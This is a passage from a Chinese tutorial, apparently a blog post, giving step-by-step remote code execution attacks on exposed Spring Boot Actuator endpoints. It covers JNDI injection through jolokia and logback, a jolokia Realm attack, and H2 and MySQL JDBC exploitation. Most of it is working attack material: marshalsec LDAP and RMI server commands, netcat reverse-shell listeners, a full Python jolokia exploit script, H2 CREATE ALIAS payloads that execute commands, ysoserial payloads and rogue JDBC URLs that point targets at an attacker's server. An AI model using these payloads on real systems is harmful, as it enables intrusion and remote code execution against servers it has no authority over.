解析 xml 文件 (这里导致了 xxe 漏洞)</li><li>xml 文件中利用 <code>logback</code> 依赖的 <code>insertFormJNDI</code> 标签，设置了外部 JNDI 服务器地址</li><li>目标机器请求恶意 JNDI 服务器，导致 JNDI 注入，造成 RCE 漏洞</li></ol><h4 id="利用方法：-7"><a href="#利用方法：-7" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：查看已存在的-MBeans"><a href="#步骤一：查看已存在的-MBeans" class="headerlink" title="步骤一：查看已存在的 MBeans"></a>步骤一：查看已存在的 MBeans</h5><p>访问 <code>/jolokia/list</code> 接口，查看是否存在 <code>ch.qos.logback.classic.jmx.JMXConfigurator</code> 和 <code>reloadByURL</code> 关键词。</p><h5 id="步骤二：托管-xml-文件"><a href="#步骤二：托管-xml-文件" class="headerlink" title="步骤二：托管 xml 文件"></a>步骤二：托管 xml 文件</h5><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用 python 快速开启 http server</span><br><br>python2 -m SimpleHTTPServer 80<br>python3 -m http.server 80<br></code></pre></td></tr></table></figure><p>在根目录放置以 <code>xml</code> 结尾的 <code>example.xml</code> 文件，内容如下：</p><p>xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">insertFromJNDI</span> <span class="hljs-attr">env-entry-name</span>=<span class="hljs-string">&quot;ldap://your-vps-ip:1389/JNDIObject&quot;</span> <span class="hljs-attr">as</span>=<span class="hljs-string">&quot;appName&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br></code></pre></td></tr></table></figure><h5 id="步骤三：准备要执行的-Java-代码"><a href="#步骤三：准备要执行的-Java-代码" class="headerlink" title="步骤三：准备要执行的 Java 代码"></a>步骤三：准备要执行的 Java 代码</h5><p>编写优化过后的用来反弹 shell 的 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java">Java 示例代码</a> <code>JNDIObject.java</code>，</p><p>使用兼容低版本 jdk 的方式编译：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">javac -<span class="hljs-built_in">source</span> 1.5 -target 1.5 JNDIObject.java<br></code></pre></td></tr></table></figure><p>然后将生成的 <code>JNDIObject.class</code> 文件拷贝到 <strong>步骤二</strong> 中的网站根目录。</p><h5 id="步骤四：架设恶意-ldap-服务"><a href="#步骤四：架设恶意-ldap-服务" class="headerlink" title="步骤四：架设恶意 ldap 服务"></a>步骤四：架设恶意 ldap 服务</h5><p>下载 <a href="https://github.com/mbechler/marshalsec">marshalsec</a> ，使用下面命令架设对应的 ldap 服务：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -<span class="hljs-built_in">cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/#JNDIObject 1389<br></code></pre></td></tr></table></figure><h5 id="步骤五：监听反弹-shell-的端口"><a href="#步骤五：监听反弹-shell-的端口" class="headerlink" title="步骤五：监听反弹 shell 的端口"></a>步骤五：监听反弹 shell 的端口</h5><p>一般使用 nc 监听端口，等待反弹 shell</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lv 443<br></code></pre></td></tr></table></figure><h5 id="步骤六：从外部-URL-地址加载日志配置文件"><a href="#步骤六：从外部-URL-地址加载日志配置文件" class="headerlink" title="步骤六：从外部 URL 地址加载日志配置文件"></a>步骤六：从外部 URL 地址加载日志配置文件</h5><blockquote><p>⚠️ 如果目标成功请求了example.xml 并且 marshalsec 也接收到了目标请求，但是目标没有请求 JNDIObject.class，大概率是因为目标环境的 jdk 版本太高，导致 JNDI 利用失败。</p></blockquote><p>替换实际的 your-vps-ip 地址访问 URL 触发漏洞：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">119.8</span>.<span class="hljs-number">60.88</span>:<span class="hljs-number">9094</span><span class="hljs-regexp">/jolokia/</span>exec<span class="hljs-regexp">/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/</span>reloadByURL<span class="hljs-regexp">/http:!/</span>!<span class="hljs-regexp">/yf8gcv.dnslog.cn!/</span>example.xml<br></code></pre></td></tr></table></figure><p><a href="https://img2024.cnblogs.com/blog/3310985/202501/3310985-20250121223338199-567294154.png"><img src="https://img2024.cnblogs.com/blog/3310985/202501/3310985-20250121223338199-567294154.png" alt="image"></a></p><h3 id="3-5-jolokia-Realm-JNDI-RCE"><a href="#3-5-jolokia-Realm-JNDI-RCE" class="headerlink" title="3.5 jolokia Realm JNDI RCE"></a>3.5 jolokia Realm JNDI RCE</h3><h4 id="利用条件：-8"><a href="#利用条件：-8" class="headerlink" title="利用条件："></a>利用条件：</h4><ul><li>目标网站存在 <code>/jolokia</code> 或 <code>/actuator/jolokia</code> 接口</li><li>目标使用了 <code>jolokia-core</code> 依赖（版本要求暂未知）并且环境中存在相关 MBean</li><li>目标可以请求攻击者的服务器（请求可出外网）</li><li>普通 JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u141&#x2F;7u131&#x2F;8u121(RMI)，但相关环境可绕过</li></ul><h4 id="漏洞原理：-4"><a href="#漏洞原理：-4" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol><li>利用 jolokia 调用 createJNDIRealm 创建 JNDIRealm</li><li>设置 connectionURL 地址为 RMI Service URL</li><li>设置 contextFactory 为 RegistryContextFactory</li><li>停止 Realm</li><li>启动 Realm 以触发指定 RMI 地址的 JNDI 注入，造成 RCE 漏洞</li></ol><h4 id="利用方法：-8"><a href="#利用方法：-8" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：查看已存在的-MBeans-1"><a href="#步骤一：查看已存在的-MBeans-1" class="headerlink" title="步骤一：查看已存在的 MBeans"></a>步骤一：查看已存在的 MBeans</h5><p>访问 <code>/jolokia/list</code> 接口，查看是否存在 <code>type=MBeanFactory</code> 和 <code>createJNDIRealm</code> 关键词。</p><h5 id="步骤二：准备要执行的-Java-代码"><a href="#步骤二：准备要执行的-Java-代码" class="headerlink" title="步骤二：准备要执行的 Java 代码"></a>步骤二：准备要执行的 Java 代码</h5><p>编写优化过后的用来反弹 shell 的 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java">Java 示例代码</a> <code>JNDIObject.java</code>。</p><h5 id="步骤三：托管-class-文件"><a href="#步骤三：托管-class-文件" class="headerlink" title="步骤三：托管 class 文件"></a>步骤三：托管 class 文件</h5><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用 python 快速开启 http server</span><br><br>python2 -m SimpleHTTPServer 80<br>python3 -m http.server 80<br></code></pre></td></tr></table></figure><p>将<strong>步骤二</strong>中编译好的 class 文件拷贝到 HTTP 服务器根目录。</p><h5 id="步骤四：架设恶意-rmi-服务"><a href="#步骤四：架设恶意-rmi-服务" class="headerlink" title="步骤四：架设恶意 rmi 服务"></a>步骤四：架设恶意 rmi 服务</h5><p>下载 <a href="https://github.com/mbechler/marshalsec">marshalsec</a> ，使用下面命令架设对应的 rmi 服务：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -<span class="hljs-built_in">cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://your-vps-ip:80/#JNDIObject 1389<br></code></pre></td></tr></table></figure><h5 id="步骤五：监听反弹-shell-的端口-1"><a href="#步骤五：监听反弹-shell-的端口-1" class="headerlink" title="步骤五：监听反弹 shell 的端口"></a>步骤五：监听反弹 shell 的端口</h5><p>一般使用 nc 监听端口，等待反弹 shell</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 443<br></code></pre></td></tr></table></figure><h5 id="步骤六：发送恶意-payload"><a href="#步骤六：发送恶意-payload" class="headerlink" title="步骤六：发送恶意 payload"></a>步骤六：发送恶意 payload</h5><p>根据实际情况修改 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-realm-jndi-rce.py">springboot-realm-jndi-rce.py</a> 脚本中的目标地址，RMI 地址、端口等信息，然后在自己控制的服务器上运行。</p><p>python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># coding: utf-8</span><br><span class="hljs-comment"># Referer: https://ricterz.me/posts/2019-03-06-yet-another-way-to-exploit-spring-boot-actuators-via-jolokia.txt</span><br><br><br><span class="hljs-keyword">import</span> requests<br><br><br>url = <span class="hljs-string">&#x27;http://127.0.0.1:8080/jolokia&#x27;</span><br><br><br>create_realm = &#123;<br>    <span class="hljs-string">&quot;mbean&quot;</span>: <span class="hljs-string">&quot;Tomcat:type=MBeanFactory&quot;</span>,<br>    <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;EXEC&quot;</span>,<br>    <span class="hljs-string">&quot;operation&quot;</span>: <span class="hljs-string">&quot;createJNDIRealm&quot;</span>,<br>    <span class="hljs-string">&quot;arguments&quot;</span>: [<span class="hljs-string">&quot;Tomcat:type=Engine&quot;</span>]<br>&#125;<br><br>wirte_factory = &#123;<br>    <span class="hljs-string">&quot;mbean&quot;</span>: <span class="hljs-string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,<br>    <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;WRITE&quot;</span>,<br>    <span class="hljs-string">&quot;attribute&quot;</span>: <span class="hljs-string">&quot;contextFactory&quot;</span>,<br>    <span class="hljs-string">&quot;value&quot;</span>: <span class="hljs-string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span><br>&#125;<br><br>write_url = &#123;<br>    <span class="hljs-string">&quot;mbean&quot;</span>: <span class="hljs-string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,<br>    <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;WRITE&quot;</span>,<br>    <span class="hljs-string">&quot;attribute&quot;</span>: <span class="hljs-string">&quot;connectionURL&quot;</span>,<br>    <span class="hljs-string">&quot;value&quot;</span>: <span class="hljs-string">&quot;rmi://your-vps-ip:1389/JNDIObject&quot;</span><br>&#125;<br><br>stop = &#123;<br>    <span class="hljs-string">&quot;mbean&quot;</span>: <span class="hljs-string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,<br>    <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;EXEC&quot;</span>,<br>    <span class="hljs-string">&quot;operation&quot;</span>: <span class="hljs-string">&quot;stop&quot;</span>,<br>    <span class="hljs-string">&quot;arguments&quot;</span>: []<br>&#125;<br><br>start = &#123;<br>    <span class="hljs-string">&quot;mbean&quot;</span>: <span class="hljs-string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,<br>    <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;EXEC&quot;</span>,<br>    <span class="hljs-string">&quot;operation&quot;</span>: <span class="hljs-string">&quot;start&quot;</span>,<br>    <span class="hljs-string">&quot;arguments&quot;</span>: []<br>&#125;<br><br>flow = [create_realm, wirte_factory, write_url, stop, start]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flow:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%s MBean %s: %s ...&#x27;</span> % (i[<span class="hljs-string">&#x27;type&#x27;</span>].title(), i[<span class="hljs-string">&#x27;mbean&#x27;</span>], i.get(<span class="hljs-string">&#x27;operation&#x27;</span>, i.get(<span class="hljs-string">&#x27;attribute&#x27;</span>))))<br>    r = requests.post(url, json=i)<br>    r.json()<br>    <span class="hljs-built_in">print</span>(r.status_code)<br></code></pre></td></tr></table></figure><h3 id="3-6-restart-h2-database-query-RCE"><a href="#3-6-restart-h2-database-query-RCE" class="headerlink" title="3.6 restart h2 database query RCE"></a>3.6 restart h2 database query RCE</h3><h4 id="利用条件：-9"><a href="#利用条件：-9" class="headerlink" title="利用条件："></a>利用条件：</h4><ul><li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li><li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li><li>存在 <code>com.h2database.h2</code> 依赖（版本要求暂未知）</li></ul><p><strong>H2数据库</strong>是一个轻量级的Java SQL数据库，它提供了内存和基于磁盘的存储选项，并支持多种数据库功能，如事务处理、索引、约束等。由于其轻量级和易用性，H2数据库在开发和测试环境中被广泛使用。</p><h4 id="漏洞原理：-5"><a href="#漏洞原理：-5" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol><li>spring.datasource.hikari.connection-test-query 属性被设置为一条恶意的 <code>CREATE ALIAS</code> 创建自定义函数的 SQL 语句</li><li>其属性对应 HikariCP 数据库连接池的 connectionTestQuery 配置，定义一个新数据库连接之前被执行的 SQL 语句</li><li>restart 重启应用，会建立新的数据库连接</li><li>如果 SQL 语句中的自定义函数还没有被执行过，那么自定义函数就会被执行，造成 RCE 漏洞</li></ol><h4 id="利用方法：-9"><a href="#利用方法：-9" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：设置-spring-datasource-hikari-connection-test-query-属性"><a href="#步骤一：设置-spring-datasource-hikari-connection-test-query-属性" class="headerlink" title="步骤一：设置 spring.datasource.hikari.connection-test-query 属性"></a>步骤一：设置 spring.datasource.hikari.connection-test-query 属性</h5><blockquote><p>⚠️ 下面payload 中的 ‘T5’ 方法每一次执行命令后都需要更换名称 (如 T6) ，然后才能被重新创建使用，否则下次 restart 重启应用时漏洞不会被触发</p></blockquote><p>spring 1.x（无回显执行命令）</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">POST /env<br>Content-<span class="hljs-keyword">Type</span>: application/x-www-form-urlencoded<br><br>spring.datasource.hikari.<span class="hljs-keyword">connection</span>-test-query=<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">ALIAS</span> T5 <span class="hljs-keyword">AS</span> CONCAT(<span class="hljs-string">&#x27;void ex(String m1,String m2,String m3)throws Exception&#123;Runti&#x27;</span>,<span class="hljs-string">&#x27;me.getRun&#x27;</span>,<span class="hljs-string">&#x27;time().exe&#x27;</span>,<span class="hljs-string">&#x27;c(new String[]&#123;m1,m2,m3&#125;);&#125;&#x27;</span>);<span class="hljs-keyword">CALL</span> T5(<span class="hljs-string">&#x27;cmd&#x27;</span>,<span class="hljs-string">&#x27;/c&#x27;</span>,<span class="hljs-string">&#x27;calc&#x27;</span>);<br></code></pre></td></tr></table></figure><p>spring 2.x（无回显执行命令）</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs haxe">POST /actuator/env<br>Content-Type: <span class="hljs-type">application</span>/json<br><br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-type"></span>&quot;spring.datasource.hikari.connection-test-query<span class="hljs-string">&quot;,&quot;</span>value<span class="hljs-string">&quot;:&quot;</span>CREATE ALIAS T5 AS CONCAT(<span class="hljs-string">&#x27;void ex(String m1,String m2,String m3)throws Exception&#123;Runti&#x27;</span>,<span class="hljs-string">&#x27;me.getRun&#x27;</span>,<span class="hljs-string">&#x27;time().exe&#x27;</span>,<span class="hljs-string">&#x27;c(new String[]&#123;m1,m2,m3&#125;);&#125;&#x27;</span>);CALL T5(<span class="hljs-string">&#x27;cmd&#x27;</span>,<span class="hljs-string">&#x27;/c&#x27;</span>,<span class="hljs-string">&#x27;calc&#x27;</span>);<span class="hljs-string">&quot;&#125;</span><br></code></pre></td></tr></table></figure><h5 id="步骤二：重启应用"><a href="#步骤二：重启应用" class="headerlink" title="步骤二：重启应用"></a>步骤二：重启应用</h5><p>spring 1.x</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">POST</span> /restart<br>Content-<span class="hljs-keyword">Type</span>: application/x-www-<span class="hljs-keyword">form</span>-urlencoded<br></code></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">POST /actuator/<span class="hljs-keyword">restart</span><br>Content-<span class="hljs-keyword">Type</span>: application/<span class="hljs-type">json</span><br></code></pre></td></tr></table></figure><h3 id="3-7-h2-database-console-JNDI-RCE"><a href="#3-7-h2-database-console-JNDI-RCE" class="headerlink" title="3.7 h2 database console JNDI RCE"></a>3.7 h2 database console JNDI RCE</h3><h4 id="利用条件：-10"><a href="#利用条件：-10" class="headerlink" title="利用条件："></a>利用条件：</h4><ul><li>存在 <code>com.h2database.h2</code> 依赖（版本要求暂未知）</li><li>spring 配置中启用 h2 console <code>spring.h2.console.enabled=true</code></li><li>目标可以请求攻击者的服务器（请求可出外网）</li><li>JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201&#x2F;7u191&#x2F;8u182&#x2F;11.0.1（LDAP 方式）</li></ul><h4 id="漏洞原理：-6"><a href="#漏洞原理：-6" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><p>H2 database是一款Java内存数据库，多用于单元测试。H2 database自带一个Web管理页面，在Spirng开发中，如果我们设置如下选项，即可允许外部用户访问Web管理页面，且没有鉴权：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">spring.h2.console.enabled</span>=<span class="hljs-literal">true</span><br><span class="hljs-attr">spring.h2.console.settings.web-allow-others</span>=<span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>利用这个管理页面，我们可以进行JNDI注入攻击，进而在目标环境下执行任意命令。</p><h4 id="利用方法：-10"><a href="#利用方法：-10" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：访问路由获得-jsessionid"><a href="#步骤一：访问路由获得-jsessionid" class="headerlink" title="步骤一：访问路由获得 jsessionid"></a>步骤一：访问路由获得 jsessionid</h5><p>直接访问目标开启 h2 console 的默认路由 <code>/h2-console</code>，目标会跳转到页面 <code>/h2-console/login.jsp?jsessionid=xxxxxx</code>，记录下实际的 <code>jsessionid=xxxxxx</code> 值。</p><h5 id="步骤二：准备要执行的-Java-代码-1"><a href="#步骤二：准备要执行的-Java-代码-1" class="headerlink" title="步骤二：准备要执行的 Java 代码"></a>步骤二：准备要执行的 Java 代码</h5><p>编写优化过后的用来反弹 shell 的 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java">Java 示例代码</a> <code>JNDIObject.java</code>，</p><p>使用兼容低版本 jdk 的方式编译：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">javac -<span class="hljs-built_in">source</span> 1.5 -target 1.5 JNDIObject.java<br></code></pre></td></tr></table></figure><p>然后将生成的 <code>JNDIObject.class</code> 文件拷贝到 <strong>步骤二</strong> 中的网站根目录。</p><h5 id="步骤三：托管-class-文件-1"><a href="#步骤三：托管-class-文件-1" class="headerlink" title="步骤三：托管 class 文件"></a>步骤三：托管 class 文件</h5><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用 python 快速开启 http server</span><br><br>python2 -m SimpleHTTPServer 80<br>python3 -m http.server 80<br></code></pre></td></tr></table></figure><p>将<strong>步骤二</strong>中编译好的 class 文件拷贝到 HTTP 服务器根目录。</p><h5 id="步骤四：架设恶意-ldap-服务-1"><a href="#步骤四：架设恶意-ldap-服务-1" class="headerlink" title="步骤四：架设恶意 ldap 服务"></a>步骤四：架设恶意 ldap 服务</h5><p>下载 <a href="https://github.com/mbechler/marshalsec">marshalsec</a> ，使用下面命令架设对应的 ldap 服务：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -<span class="hljs-built_in">cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/#JNDIObject 1389<br></code></pre></td></tr></table></figure><h5 id="步骤五：监听反弹-shell-的端口-2"><a href="#步骤五：监听反弹-shell-的端口-2" class="headerlink" title="步骤五：监听反弹 shell 的端口"></a>步骤五：监听反弹 shell 的端口</h5><p>一般使用 nc 监听端口，等待反弹 shell</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lv 443<br></code></pre></td></tr></table></figure><h5 id="步骤六：发包触发-JNDI-注入"><a href="#步骤六：发包触发-JNDI-注入" class="headerlink" title="步骤六：发包触发 JNDI 注入"></a>步骤六：发包触发 JNDI 注入</h5><p>根据实际情况，替换下面数据中的 <code>jsessionid=xxxxxx</code>、<code>www.example.com</code> 和 <code>ldap://your-vps-ip:1389/JNDIObject</code></p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST /h2-console/login.do?jsessionid=xxxxxx<br>Host: www.example.com<br>Content-Type: application/x-www-form-urlencoded<br>Referer: http://www.example.com/h2-console/login.jsp?jsessionid=xxxxxx<br><br>language=en&amp;setting=Generic+H2+%28Embedded%29&amp;name=Generic+H2+%28Embedded%29&amp;driver=javax.naming.InitialContext&amp;url=ldap://your-vps-ip:1389/JNDIObject&amp;user=&amp;password=<br></code></pre></td></tr></table></figure><h3 id="3-8-mysql-jdbc-deserialization-RCE"><a href="#3-8-mysql-jdbc-deserialization-RCE" class="headerlink" title="3.8 mysql jdbc deserialization RCE"></a>3.8 mysql jdbc deserialization RCE</h3><h4 id="利用条件：-11"><a href="#利用条件：-11" class="headerlink" title="利用条件："></a>利用条件：</h4><ul><li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li><li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</li><li>目标环境中存在 <code>mysql-connector-java</code> 依赖</li><li>目标可以请求攻击者的服务器（请求可出外网）</li></ul><h4 id="漏洞原理：-7"><a href="#漏洞原理：-7" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol><li>spring.datasource.url 属性被设置为外部恶意 mysql jdbc url 地址</li><li>refresh 刷新后设置了一个新的 spring.datasource.url 属性值</li><li>当网站进行数据库查询等操作时，会尝试使用恶意 mysql jdbc url 建立新的数据库连接</li><li>然后恶意 mysql server 就会在建立连接的合适阶段返回反序列化 payload 数据</li><li>目标依赖的 mysql-connector-java 就会反序列化设置好的 gadget，造成 RCE 漏洞</li></ol><h4 id="利用方法：-11"><a href="#利用方法：-11" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：查看环境依赖"><a href="#步骤一：查看环境依赖" class="headerlink" title="步骤一：查看环境依赖"></a>步骤一：查看环境依赖</h5><p>GET 请求 <code>/env</code> 或 <code>/actuator/env</code>，搜索环境变量（classpath）中是否有 <code>mysql-connector-java</code> 关键词，并记录下其版本号（5.x 或 8.x）；</p><p>搜索并观察环境变量中是否存在常见的反序列化 gadget 依赖，比如 <code>commons-collections</code>、<code>Jdk7u21</code>、<code>Jdk8u20</code> 等；</p><p>搜索 <code>spring.datasource.url</code> 关键词，记录下其 <code>value</code> 值，方便后续恢复其正常 jdbc url 值。</p><h5 id="步骤二：架设恶意-rogue-mysql-server"><a href="#步骤二：架设恶意-rogue-mysql-server" class="headerlink" title="步骤二：架设恶意 rogue mysql server"></a>步骤二：架设恶意 rogue mysql server</h5><p>在自己控制的服务器上运行 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-jdbc-deserialization-rce.py">springboot-jdbc-deserialization-rce.py</a> 脚本，并使用 <a href="https://github.com/frohoff/ysoserial">ysoserial</a> 自定义要执行的命令：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar ysoserial.jar CommonsCollections3 calc &gt; payload.ser<br></code></pre></td></tr></table></figure><p>在脚本<strong>同目录下</strong>生成 <code>payload.ser</code> 反序列化 payload 文件，供脚本使用。</p><h5 id="步骤三：设置-spring-datasource-url-属性"><a href="#步骤三：设置-spring-datasource-url-属性" class="headerlink" title="步骤三：设置 spring.datasource.url 属性"></a>步骤三：设置 spring.datasource.url 属性</h5><blockquote><p>⚠️ 修改此属性会暂时导致网站所有的正常数据库服务不可用，会对业务造成影响，请谨慎操作！</p></blockquote><p>mysql-connector-java 5.x 版本设置<strong>属性值</strong>为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&amp;useSSL=<span class="hljs-literal">false</span>&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=<span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>mysql-connector-java 8.x 版本设置<strong>属性值</strong>为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&amp;useSSL=<span class="hljs-literal">false</span>&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=<span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>spring 1.x</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nix">POST <span class="hljs-symbol">/env</span><br><span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span><br><br><span class="hljs-attr">spring.datasource.url</span><span class="hljs-operator">=</span>对应属性值<br></code></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nix">POST <span class="hljs-symbol">/actuator/env</span><br><span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/json</span><br><br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;spring.datasource.url&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>:<span class="hljs-string">&quot;对应属性值&quot;</span>&#125;<br></code></pre></td></tr></table></figure><h5 id="步骤四：刷新配置-1"><a href="#步骤四：刷新配置-1" class="headerlink" 